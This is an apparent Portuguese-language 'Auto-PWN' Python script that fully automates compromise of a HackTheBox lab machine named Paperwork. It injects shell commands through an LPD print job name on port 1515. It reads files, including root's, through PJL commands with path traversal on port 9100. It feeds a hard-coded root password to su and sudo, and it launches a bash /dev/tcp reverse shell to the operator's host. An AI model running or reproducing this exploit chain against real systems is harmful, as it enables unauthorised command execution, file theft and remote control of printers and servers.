#!/usr/bin/env python3

"""
Auto-PWN para HackTheBox - Paperwork
Uso: python3 auto_pwn.py <TARGET_IP> <SUA_IP>
Exemplo: python3 auto_pwn.py 10.10.10.10 10.10.14.14
"""

import socket
import time
import subprocess
import sys
import os
import re

# Cores para output

VERDE = '\033[92m'
AMARELO = '\033[93m'
VERMELHO = '\033[91m'
AZUL = '\033[94m'
RESET = '\033[0m'

def print_status(msg, tipo="info"):
    """Imprime mensagens com cores"""
    if tipo == "success":
        print(f"{VERDE}[+] {msg}{RESET}")
    elif tipo == "error":
        print(f"{VERMELHO}[-] {msg}{RESET}")
    elif tipo == "info":
        print(f"{AZUL}[*] {msg}{RESET}")
    elif tipo == "warning":
        print(f"{AMARELO}[!] {msg}{RESET}")

def exploit_lpd(target, command):
    """
    Explora a vulnerabilidade no LPD (porta 1515)
    para executar comandos como o usuário lp
    """
    try:
        job_name = f"'; {command}; #"
        control_file = ("Hlocalhost\n" "Ptester\n" f"J{job_name}\n").encode()
       
        with socket.create_connection((target, 1515), timeout=5) as sock:
            sock.sendall(b"\x02\n")
            time.sleep(0.3)
           
            header = b"\x02" + str(len(control_file)).encode() + b" cfA001localhost\n"
            sock.sendall(header)
           
            ack = sock.recv(1)
            sock.sendall(control_file + b"\x00")
           
        return True
    except Exception as e:
        print_status(f"Erro no exploit LPD: {e}", "error")
        return False

def read_file_via_pjl(target, filepath):
    """
    Lê arquivos usando o serviço PJL na porta 9100
    """
    try:
        with socket.create_connection((target, 9100), timeout=5) as sock:
            sock.send(f'@PJL FSUPLOAD NAME="{filepath}"\n'.encode())
            data = sock.recv(4096)
            return data.decode(errors='ignore')
    except Exception as e:
        print_status(f"Erro lendo arquivo: {e}", "error")
        return None

def get_user_flag(target):
    """Obtém a flag do usuário"""
    print_status("Obtendo flag do usuário...", "info")
   
    # Tenta ler o arquivo user.txt

    paths = [
        "/home/archivist/user.txt",
        "/home/user/user.txt",
        "/home/*/user.txt"
    ]
   
    for path in paths:
        result = read_file_via_pjl(target, path)
        if result and "FILEERROR" not in result:
            # Extrai apenas a flag se tiver texto extra

            flag_match = re.search(r'[a-f0-9]{32}', result)
            if flag_match:
                print_status(f"Flag do usuário encontrada: {flag_match.group()}", "success")
                return flag_match.group()
            print_status(f"Flag do usuário: {result.strip()}", "success")
            return result.strip()
   
    # Se falhar, tenta com o exploit LPD

    print_status("Tentando método alternativo com LPD...", "warning")
    command = "cat /home/archivist/user.txt > /tmp/user_flag.txt"
    if exploit_lpd(target, command):
        time.sleep(1)
        result = read_file_via_pjl(target, "/tmp/user_flag.txt")
        if result and "FILEERROR" not in result:
            flag_match = re.search(r'[a-f0-9]{32}', result)
            if flag_match:
                print_status(f"Flag do usuário: {flag_match.group()}", "success")
                return flag_match.group()
            print_status(f"Flag do usuário: {result.strip()}", "success")
            return result.strip()
   
    print_status("Não foi possível obter a flag do usuário", "error")
    return None

def get_root_flag(target, password="ApparelMortuaryCedar22"):
    """Obtém a flag de root usando a senha encontrada"""
    print_status("Obtendo flag de root...", "info")
    print_status(f"Usando senha: {password}", "info")
   
    # Primeiro tenta com path traversal no PJL

    paths = [
        "/root/root.txt",
        "../../../../root/root.txt",
        "../../../root/root.txt",
        "/root.txt"
    ]
   
    for path in paths:
        result = read_file_via_pjl(target, path)
        if result and "FILEERROR" not in result and len(result.strip()) > 10:
            flag_match = re.search(r'[a-f0-9]{32}', result)
            if flag_match:
                print_status(f"Flag de root encontrada: {flag_match.group()}", "success")
                return flag_match.group()
            print_status(f"Flag de root: {result.strip()}", "success")
            return result.strip()
   
    # Tenta usar a senha com su

    print_status("Tentando usar a senha para su...", "warning")
   
    # Tenta diferentes combinações de comandos

    commands = [
        f"echo '{password}' | su - root -c 'cat /root/root.txt' > /tmp/root_flag.txt",
        f"echo '{password}' | sudo -S cat /root/root.txt > /tmp/root_flag.txt",
        f"su - root -c 'cat /root/root.txt' < <(echo '{password}') > /tmp/root_flag.txt",
        f"printf '{password}\\n' | su - root -c 'cat /root/root.txt' > /tmp/root_flag.txt"
    ]
   
    for cmd in commands:
        print_status(f"Tentando comando: {cmd[:50]}...", "info")
        if exploit_lpd(target, cmd):
            time.sleep(2)
            result = read_file_via_pjl(target, "/tmp/root_flag.txt")
            if result and "FILEERROR" not in result and len(result.strip()) > 5:
                flag_match = re.search(r'[a-f0-9]{32}', result)
                if flag_match:
                    print_status(f"Flag de root: {flag_match.group()}", "success")
                    return flag_match.group()
                print_status(f"Flag de root: {result.strip()}", "success")
                return result.strip()
   
    print_status("Não foi possível obter a flag de root", "error")
    return None

def get_reverse_shell(target, lhost, lport=4444):
    """Obtém uma reverse shell"""
    print_status("Preparando reverse shell...", "info")
   
    # Comando para reverse shell

    command = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
   
    # Inicia o listener em segundo plano

    print_status(f"Inicie um listener: nc -lvnp {lport}", "warning")
    print_status("Pressione Enter após iniciar o listener...", "info")
    input()
   
    # Executa o exploit

    if exploit_lpd(target, command):
        print_status("Reverse shell enviada! Verifique seu listener.", "success")
        return True
    else:
        print_status("Não foi possível obter reverse shell", "error")
        return False

def check_connection(target):
    """Verifica se o alvo está acessível"""
    try:
        socket.create_connection((target, 1515), timeout=3)
        return True
    except:
        return False

def main():
    """Função principal"""
    # Verifica argumentos

    if len(sys.argv) < 3:
        print(f"""
{AZUL}═══════════════════════════════════════════════
    Auto-PWN para HackTheBox - Paperwork
    Uso: python3 auto_pwn.py <TARGET_IP> <SUA_IP>
    Exemplo: python3 auto_pwn.py 10.10.10.10 10.10.14.14
═══════════════════════════════════════════════{RESET}
        """)
        sys.exit(1)
   
    TARGET = sys.argv[1]
    LHOST = sys.argv[2]
   
    print(f"""
{AZUL}═══════════════════════════════════════════════
    Auto-PWN para HackTheBox - Paperwork
    Target: {TARGET}
    Sua IP: {LHOST}
═══════════════════════════════════════════════{RESET}
    """)
   
    # Verifica conexão

    print_status("Verificando conexão com o alvo...", "info")
    if not check_connection(TARGET):
        print_status("Não foi possível conectar ao alvo!", "error")
        sys.exit(1)
    print_status("Conexão estabelecida!", "success")
   
    # Senha encontrada

    PASSWORD = "ApparelMortuaryCedar22"
   
    print_status("Iniciando exploit...", "info")
   
    # PASSO 1: Flag do usuário

    print_status("\n[PASSO 1] Obtendo flag do usuário", "info")
    user_flag = get_user_flag(TARGET)
   
    if user_flag:
        print_status(f"✅ FLAG DO USUÁRIO: {user_flag}", "success")
    else:
        print_status("❌ Não foi possível obter a flag do usuário", "error")
   
    # PASSO 2: Flag de root

    print_status("\n[PASSO 2] Obtendo flag de root", "info")
    root_flag = get_root_flag(TARGET, PASSWORD)
   
    if root_flag:
        print_status(f"✅ FLAG DE ROOT: {root_flag}", "success")
    else:
        print_status("❌ Não foi possível obter a flag de root", "error")
   
    # PASSO 3: Reverse shell (opcional)

    print_status("\n[PASSO 3] Reverse shell", "info")
    response = input("Deseja obter uma reverse shell? (s/n): ")
    if response.lower() in ['s', 'sim', 'y', 'yes']:
        get_reverse_shell(TARGET, LHOST)
   
    print_status("\n🚀 Exploit concluído!", "success")
   
    # Resumo

    print(f"""
{AZUL}═══════════════════════════════════════════════
    RESUMO DA EXPLORAÇÃO
    Target: {TARGET}
    Flag do usuário: {user_flag if user_flag else "NÃO ENCONTRADA"}
    Flag de root: {root_flag if root_flag else "NÃO ENCONTRADA"}
═══════════════════════════════════════════════{RESET}
    """)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_status("\n[!] Interrompido pelo usuário", "warning")
        sys.exit(0)
    except Exception as e:
        print_status(f"Erro inesperado: {e}", "error")
        sys.exit(1)
